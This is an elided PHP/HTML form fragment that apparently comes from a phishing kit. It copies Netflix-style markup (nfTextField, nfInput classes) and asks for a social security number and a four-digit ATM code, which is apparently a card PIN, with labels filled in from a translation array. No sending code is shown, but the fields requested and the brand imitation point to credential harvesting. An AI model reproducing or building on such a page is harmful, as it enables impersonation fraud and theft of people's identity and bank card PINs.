            ...
            <form method="post" action="javascript:void(0)" novalidate data-valid="<?php echo $info_tr['required']?>">
               <div class="fieldContainer">
                  ...
                  <ul class="simpleForm structural ui-grid">
					 ...
					 <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="ssn" name="ssn"><label for="ssn" class="placeLabel"><?php echo $info_tr['ssn']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
					 ...
					 <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="tel" class="nfTextField" id="atm" maxlength="4" minlength="4" name="atm"><label for="atm" class="placeLabel"><?php echo $info_tr['atm']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
